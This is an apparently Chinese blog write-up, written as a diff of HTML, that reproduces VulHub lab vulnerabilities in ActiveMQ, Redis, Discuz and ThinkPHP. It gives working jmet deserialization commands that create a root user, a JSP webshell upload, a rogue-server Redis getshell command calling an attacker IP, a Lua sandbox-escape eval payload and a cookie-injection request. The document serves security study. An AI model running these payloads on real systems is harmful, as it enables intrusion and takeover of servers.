+<li>访问web管理页面,读取消息,触发漏洞</li>
+</ol>
+<p>使用<a target="_blank" rel="noopener" href="https://github.com/matthiaskaiser/jmet">jmet</a>进行漏洞利用.首先下载jmet的jar文件,并在同目录下创建一个<strong>external文件夹</strong></p>
+<p>jmet原理是使用ysoserial生成Payload并发送(其jar内自带ysoserial,无需再自己下载),所以我们需要在ysoserial是gadget中选择一个可以使用的,比如ROME.</p>
+<p>执行:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y <span class="string">&quot;ping 6b3chr.dnslog.cn&quot;</span> -Yp ROME 103.116.46.7 61616</span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210221734981.png" data-fancybox="true"/></div></div>
+
+<p>此时会给目标的ActiveMQ添加一个名为事件的队列,可以我们通过<code>http://103.116.46.7:8161/admin/browse.jsp?JMSDestination=event</code>看到这个队列中所有消息</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210221735270.png" data-fancybox="true"/></div></div>
+
+<p>点击查看这条消息即可触发命令执行</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210221736445.png" data-fancybox="true"/></div></div>
+
+<h4 id="远程添加root用户"><a href="#远程添加root用户" class="headerlink" title="远程添加root用户"></a>远程添加root用户</h4><p>执行jmet的命令添加test用户并将其添加到root组,返回<code>http://103.116.46.7:8161/admin/browse.jsp?JMSDestination=event</code>页面,点击一下消息,触发它</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y <span class="string">&quot;useradd -g root -s /bin/bash -u 10010 test&quot;</span> -Yp ROME 103.116.46.7 61616</span><br></pre></td></tr></table></figure>
+
+<p>让我们再将passwd中的test的uid修改为0,使它拥有root权限,返回<code>http://103.116.46.7:8161/admin/browse.jsp?JMSDestination=event</code>页面,点击一下消息,触发它.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y <span class="string">&quot;sed -i &quot;</span>s/test:x:10010/test:x:0/g<span class="string">&quot; /etc/passwd&quot;</span> -Yp ROME 103.116.46.7 61616</span><br></pre></td></tr></table></figure>
+
+<p>让我们再为test用户设置一个密码,返回<code>http://103.116.46.7:8161/admin/browse.jsp?JMSDestination=event</code>页面,点击一下消息,触发它.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y <span class="string">&quot;echo &quot;</span><span class="built_in">test</span>:sd123456<span class="string">&quot; | chpasswd&quot;</span> -Yp ROME 103.116.46.7 61616</span><br></pre></td></tr></table></figure>
+
+<p>到此为止,一个权限为root,密码为123456的用户即创建完毕.我们可以使用ssh直接远程登陆进入操作系统,并且还是最高权限.</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402081917102.png" data-fancybox="true"/></div></div>
+
+<h2 id="ActiveMQ任意文件写入漏洞-CVE-2016-3088"><a href="#ActiveMQ任意文件写入漏洞-CVE-2016-3088" class="headerlink" title="ActiveMQ任意文件写入漏洞(CVE-2016-3088)"></a>ActiveMQ任意文件写入漏洞(CVE-2016-3088)</h2><h3 id="漏洞概述-3"><a href="#漏洞概述-3" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>ActiveMQ的web控制台分三个应用,admin、api和fileserver,其中admin是管理员页面,api是接口,fileserver是储存文件的接口;admin和api都需要登录后才能使用,fileserver无需登录.</p>
+<p>fileserver是一个RESTful API接口,我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作,其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷,但后来发现:</p>
+<ol>
+<li>其使用率并不高</li>
+<li>文件操作容易出现漏洞</li>
+</ol>
+<p>所以,ActiveMQ在5.12.x~5.13.x版本中,已经默认关闭了fileserver这个应用(你可以在conf&#x2F;jetty.xml中开启之);在5.14.0版本以后,彻底删除了fileserver应用.</p>
+<p>在测试过程中,可以关注ActiveMQ的版本,避免走弯路.</p>
+<h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>环境监听61616端口和8161端口,其中8161为web控制台端口,本漏洞就出现在web控制台中.</p>
+<p>访问<code>http://103.116.46.7:8161/</code>看到web页面,说明环境已成功运行.</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210221742681.png" data-fancybox="true"/></div></div>
+
+<p>本漏洞出现在fileserver应用中,漏洞原理其实非常简单,就是fileserver支持写入文件(但不解析jsp),同时支持移动文件(MOVE请求).所以,我们只需要写入一个文件,然后使用MOVE请求将其移动到任意位置,造成任意文件写入漏洞.</p>
+<p>文件写入有几种利用方法:</p>
+<ol>
+<li>写入webshell</li>
+<li>写入cron或ssh key等文件</li>
+<li>写入jar或jetty.xml等库和配置文件</li>
+</ol>
+<p>写入webshell的好处是,门槛低更方便,但前面也说了fileserver不解析jsp,admin和api两个应用都需要登录才能访问,所以有点鸡肋;写入cron或ssh key,好处是直接反弹拿shell,也比较方便,缺点是需要root权限;写入jar,稍微麻烦点(需要jar的后门),写入xml配置文件,这个方法比较靠谱,但有个鸡肋点是:我们需要知道activemq的绝对路径.</p>
+<p>分别说一下上述几种利用方法.</p>
+<h4 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h4><p>前面说了,写入webshell,需要写在admin或api应用中,而这俩应用都需要登录才能访问.</p>
+<p>默认的ActiveMQ账号密码均为<code>admin</code>,首先访问<code>http://103.116.46.7:8161/admin/test/systemProperties.jsp</code>,查看ActiveMQ的绝对路径:</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210221745666.png" data-fancybox="true"/></div></div>
+
+<p>然后上传webshell:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">PUT /fileserver/1.txt HTTP/1.1</span><br><span class="line">Host: 103.116.46.7:8161</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 334</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%@ page import=&quot;java.io.*&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"> out.print(&quot;Hello&lt;/br&gt;&quot;);</span><br><span class="line"> String strcmd=request.getParameter(&quot;cmd&quot;);</span><br><span class="line"> String line=null;</span><br><span class="line"> Process p=Runtime.getRuntime().exec(strcmd);</span><br><span class="line"> BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));</span><br><span class="line"> while((line=br.readLine())!=null)&#123;</span><br><span class="line">  out.print(line+&quot;&lt;/br&gt;&quot;);</span><br><span class="line"> &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210221817323.png" data-fancybox="true"/></div></div>
+
+<p>移动到web目录下的api文件夹(<code>/opt/activemq/webapps/api/a.jsp</code>)中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MOVE /fileserver/1.txt HTTP/1.1</span><br><span class="line">Destination: file:///opt/activemq/webapps/api/a.jsp</span><br><span class="line">Host: 103.116.46.7:8161</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>利用该版本存在的未授权访问漏洞,不用登录,访问<a target="_blank" rel="noopener" href="http://103.116.46.7:8161/api/a.jsp?cmd=ls,%E4%B8%8B%E5%9B%BE%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%88%90%E5%8A%9F%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4">http://103.116.46.7:8161/api/a.jsp?cmd=ls,下图可以看到成功执行命令</a></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210221822193.png" data-fancybox="true"/></div></div>
+
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>ActiveMQ Fileserver 的功能在 5.14.0 及其以后的版本中已被移除.建议用户升级至 5.14.0 及其以后版本</p>
+<h2 id="Redis-4-unacc未授权访问漏洞"><a href="#Redis-4-unacc未授权访问漏洞" class="headerlink" title="Redis 4-unacc未授权访问漏洞"></a>Redis 4-unacc未授权访问漏洞</h2><h3 id="漏洞复现-4"><a href="#漏洞复现-4" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><strong>此靶机不要使用云服务器,否则后面无法连接</strong></p>
+<p>使用nmap扫描靶机端口</p>
+<p> 如下图所示,redis服务正常开启了,在6379端口</p>
+<p>攻击机用直接用redis连接,发现可直接访问,还能通过info命令查看到服务器等一些有价值的信息</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210221851453.png" data-fancybox="true"/></div></div>
+
+<p> 这足以证明存在未授权访问漏洞</p>
+<p>接下来使用网上存在的 <a target="_blank" rel="noopener" href="https://github.com/vulhub/redis-rogue-getshell">exp</a>,先下载到本地,命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://security-1258894728.cos.ap-beijing.myqcloud.com/writeup/vulhub/other/redis-rogue-getshell-master.zip</span><br><span class="line">unzip redis-rogue-getshell-master.zip</span><br><span class="line"><span class="built_in">cd</span> redis-rogue-getshell-master/RedisModulesSDK</span><br><span class="line"><span class="comment"># 编译(编译后,当前目录下会有一个exp.so的文件)</span></span><br><span class="line">make</span><br><span class="line"><span class="built_in">cd</span> ../</span><br><span class="line">./redis-master.py -r 靶机IP -p 6379 -L 攻击机IP -P 8989 -f RedisModulesSDK/exp/exp.so -c <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210221854125.png" data-fancybox="true"/></div></div>
+
+<p>成功GETSHELL并执行了whoami的命令</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402081917821.png" data-fancybox="true"/></div></div>
+
+<h2 id="Redis-Lua沙盒绕过命令执行-CVE-2022-0543"><a href="#Redis-Lua沙盒绕过命令执行-CVE-2022-0543" class="headerlink" title="Redis Lua沙盒绕过命令执行(CVE-2022-0543)"></a>Redis Lua沙盒绕过命令执行(CVE-2022-0543)</h2><h3 id="漏洞概述-4"><a href="#漏洞概述-4" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>影响范围 : Debian 系的 Linux 发行版本 + Ubuntu</p>
+<p>CVE-2022-0543 该 Redis 沙盒逃逸漏洞影响 Debian 系的 Linux 发行版本,并非 Redis 本身漏洞, 漏洞形成原因在于系统补丁加载了一些redis源码注释了的代码</p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>redis一直有一个攻击面,就是在用户连接redis后,可以通过eval命令执行lua脚本.</p>
+<p>但这个脚本跑在沙箱里,正常情况下无法执行命令,读取文件</p>
+<p>所以这个CVE本质是一个沙箱绕过漏洞</p>
+<p>Ubuntu&#x2F;Debian&#x2F;CentOS等这些发行版本会在原始软件的基础上打一些补丁包给Redis打了一个的补丁,增加了一个include, 下面是Debian通过shell使用make生成补丁包的源码 :</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">debian/lua_libs_debian.c:</span><br><span class="line">    echo <span class="string">&quot;// Automatically generated; do not edit.&quot;</span> &gt;$@</span><br><span class="line">    echo <span class="string">&quot;luaLoadLib(lua, LUA_LOADLIBNAME, luaopen_package);&quot;</span> &gt;&gt;$@</span><br><span class="line">    <span class="built_in">set</span> -e; <span class="keyword">for</span> X in $(LUA_LIBS_DEBIAN_NAMES); <span class="keyword">do</span> \</span><br><span class="line">        echo <span class="string">&quot;if (luaL_dostring(lua, \&quot;$$X = require(&#x27;$$X&#x27;);\&quot;))&quot;</span> &gt;&gt;$@; \</span><br><span class="line">        echo <span class="string">&quot;    serverLog(LL_NOTICE, \&quot;Error loading $$X library\&quot;);&quot;</span> &gt;&gt;$@; \</span><br><span class="line">    done</span><br><span class="line">    echo <span class="string">&#x27;luaL_dostring(lua, &quot;module = nil; require = nil;&quot;);&#x27;</span> &gt;&gt;$@</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>luaLoadLib(lua, LUA_LOADLIBNAME, luaopen_package)</code>就是漏洞的来源,.</li>
+</ul>
+<p>这段代码原本在redis源码里已经是被注释了的, 将其注释掉的原因就是<code>for sandboxing concerns</code></p>
+<p>Debian的这个补丁却把这句话重新写进去了, 导致在 Lua 沙箱中遗留了一个对象<code>package</code>,攻击者可以利用这个<code>package</code>对象提供的方法加载动态链接库<code>liblua</code> 里的函数,进而逃逸沙箱执行任意命令</p>
+<p>借助 Lua 沙箱中遗留的变量<code>package</code>的<code>loadlib</code>函数来加载动态链接库<code>/usr/lib/x86_64-linux-gnu/liblua5.1.so.0</code>里的导出函数<code>luaopen_io</code>在 Lua 中执行这个导出函数,即可获得io库,再使用其执行命令.</p>
+<p>需要注意的一点是 : 不同系统下<code>liblua5.1.so.0</code>的路径可能不同</p>
+<p>我们可以利用这个模块,来加载任意<code>Lua</code>库,最终逃逸沙箱,执行任意命令:</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> io_l = <span class="built_in">package</span>.<span class="built_in">loadlib</span>(<span class="string">&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;</span>, <span class="string">&quot;luaopen_io&quot;</span>);</span><br><span class="line"><span class="keyword">local</span> <span class="built_in">io</span> = io_l();</span><br><span class="line"><span class="keyword">local</span> f = <span class="built_in">io</span>.<span class="built_in">popen</span>(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">local</span> res = f:<span class="built_in">read</span>(<span class="string">&quot;*a&quot;</span>);</span><br><span class="line">f:<span class="built_in">close</span>();</span><br><span class="line"><span class="keyword">return</span> res</span><br><span class="line">eval <span class="string">&#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;uname -a&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27;</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="漏洞复现-5"><a href="#漏洞复现-5" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ol>
+<li><p>直接通过<code>redis-cli -h 127.0.0.1</code>进入redis里面进行测试</p>
+</li>
+<li><p>使用<code>eval</code>命令执行上述脚本:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span> <span class="string">&#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;whoami&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27;</span> 0</span><br></pre></td></tr></table></figure></li>
+</ol>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210221926830.png" data-fancybox="true"/></div></div>
+
+<p>最后的一点话 :</p>
+<p>之所以Ubuntu也受到影响是因为Ubuntu基于Debian, 所以就存在着同样的问题</p>
+<h2 id="Discuz-7-x-6-x-全局变量防御绕过导致代码执行"><a href="#Discuz-7-x-6-x-全局变量防御绕过导致代码执行" class="headerlink" title="Discuz 7.x&#x2F;6.x 全局变量防御绕过导致代码执行"></a>Discuz 7.x&#x2F;6.x 全局变量防御绕过导致代码执行</h2><h3 id="漏洞概述-5"><a href="#漏洞概述-5" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>​    由于php5.3.x版本里php.ini的设置里request_order默认值为GP,导致$_REQUEST中不再包含$_COOKIE,我们通过在Cookie中传入$GLOBALS来覆盖全局变量,造成代码执行漏洞.</p>
+<p><strong>利用条件:</strong></p>
+<ol>
+<li><p>discuz 6.x &#x2F; 7.x</p>
+</li>
+<li><p>request_order默认值为GP</p>
+</li>
+</ol>
+<h3 id="漏洞复现-6"><a href="#漏洞复现-6" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ol>
+<li><p>访问漏洞环境<code>http://192.168.164.128:8080/install/</code></p>
+<p>数据库地址填写db,数据库名为discuz,数据库账号密码均为root.</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210231137588.png" data-fancybox="true"/></div></div>
+</li>
+<li><p>访问首页</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210231137363.png" data-fancybox="true"/></div></div>
+</li>
+<li><p>安装成功以后,直接找一个已经存在的帖子,向其发送数据包,利用burpsite工具修改Cookie值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /viewthread.php?tid=7&amp;extra=page%3D1 HTTP/1.1</span><br><span class="line">Host: 192.168.164.128:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie:GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>修改完成后,点击发送请求,查看返回包	<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210231139644.png" data-fancybox="true"/></div></div></p>
+</li>
+</ol>
+<h3 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h3><ul>
+<li>升级版本</li>
+</ul>
+<h2 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h2><h3 id="ThinkPHP-5-5-0-22-5-1-29-远程代码执行漏洞"><a href="#ThinkPHP-5-5-0-22-5-1-29-远程代码执行漏洞" class="headerlink" title="ThinkPHP 5 5.0.22&#x2F;5.1.29 远程代码执行漏洞"></a>ThinkPHP 5 5.0.22&#x2F;5.1.29 远程代码执行漏洞</h3><h4 id="漏洞概述-6"><a href="#漏洞概述-6" class="headerlink" title="漏洞概述"></a>漏洞概述</h4><p>ThinkPHP是一款运用极广的PHP开发框架.其版本5中,由于没有正确处理控制器名,导致在网站没有开启强制路由的情况下(即默认情况下)可以执行任意方法,从而导致远程命令执行漏洞.</p>
+<h4 id="漏洞复现-7"><a href="#漏洞复现-7" class="headerlink" title="漏洞复现"></a>漏洞复现</h4>
+<div class="article-footer fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文由 <a href="https://jiangjiyue.github.io/">kill3r</a> 原创,采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+    <section id="share">
+      <div class="header"><span>分享文章</span></div>
+      <div class="body">
+        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="https://jiangjiyue.github.io/2023/05/03/fe16a42b/" /></div>
+        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=https://jiangjiyue.github.io/2023/05/03/fe16a42b/&title=VulHub-杂项漏洞复现 - SafeKiller Zone&pics=https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402051127776.png&summary=
+    总字符数: 10.80K 
+    
+    
+    代码: 3.25K, 文本: 3.19K
+    
+    
